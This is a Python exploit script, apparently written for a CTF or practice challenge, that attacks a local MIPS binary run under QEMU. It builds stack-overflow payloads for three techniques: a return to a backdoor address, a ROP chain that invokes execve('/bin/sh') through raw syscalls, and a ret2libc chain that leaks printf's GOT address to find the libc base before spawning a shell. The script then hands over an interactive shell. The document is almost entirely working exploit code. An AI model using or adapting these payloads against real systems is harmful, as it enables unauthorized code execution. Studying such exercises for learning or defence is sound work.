from pwncli import *  # type: ignore # Add other required names explicitly

context.binary = './hello'
context.arch = 'mips'
context.endian = 'little'

import argparse

parser = argparse.ArgumentParser(description='Exploit static binary with QEMU')
parser.add_argument('--debug', action='store_true', help='Run in debug mode')
args = parser.parse_args()

debug_flag = False

if args.debug:
    context.log_level = 'debug'
    gift.io = process(['qemu-mipsel', '-g', '1234', '-L', './lib','./hello'])
    debug_flag = True
else:
    context.log_level = 'debug'
    gift.io = process(['qemu-mipsel', '-L', './lib','./hello'])

gift.elf = ELF('./hello')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = ELF('./lib/lib/libc.so.6')

def ret2text():
    back_door = 0x400780
    payload = flat([cyclic(0x18), p32(back_door)])
    
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2syscall():
    bin_sh = 0x400B80
    lw_a0_a1_a2_ra_jr_ra = 0x4007C8
    lw_v0_ra_jr_ra = 0x4007E8
    syscall = 0x4007FC
    payload = flat([cyclic(0x18), 
                p32(lw_a0_a1_a2_ra_jr_ra), 
                p32(bin_sh), p32(0), p32(0), 
                p32(lw_v0_ra_jr_ra), 
                p32(4000 + 11), p32(syscall)])
  
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2libc():
    printf_got = elf.got['printf']
    start_addr = 0x400650
    lw_a0_a1_a2_ra_jr_ra = 0x4007C8
    lw_t0_ra_jr_t0 = 0x400800
    lw_v0_ra_jr_ra = 0x4007E8
    syscall = 0x4007FC # syscall -> lw_t0_ra_jr_t0
    payload_1 = flat([cyclic(0x18),
        p32(lw_a0_a1_a2_ra_jr_ra),
        p32(1),
        p32(printf_got),
        p32(4),
        p32(lw_v0_ra_jr_ra),
        p32(4000 + 4), # write
        p32(lw_t0_ra_jr_t0),
        p32(syscall), # -> lw_t0_ra_jr_t0
        p32(start_addr),
        p32(start_addr),
        p32(start_addr)
    ])
    if debug_flag: pause()
    sa("Enter a string: ", payload_1)
    ru("\n")
    printf_addr = u32(r(4))
    libc.address = printf_addr - libc.sym['printf']
    log.success(f"printf address: {hex(printf_addr)}")
    log.success(f"libc base address: {hex(libc.address)}")
    log.success(f"system address: {hex(libc.sym['system'])}")
    log.success(f"/bin/sh address: {hex(next(libc.search(b'/bin/sh\x00')))}")
    if debug_flag: pause()

    payload_2 = flat([cyclic(0x18), 
                p32(lw_a0_a1_a2_ra_jr_ra), 
                p32(next(libc.search(b'/bin/sh\x00'))), p32(0), p32(0), 
                p32(lw_v0_ra_jr_ra), 
                p32(4000 + 11), p32(syscall)
    ])
    sa("Enter a string: ", payload_2)
    if debug_flag: pause()
    ru("\n")

if __name__ == "__main__":
    ret2libc()
    gift.io.interactive()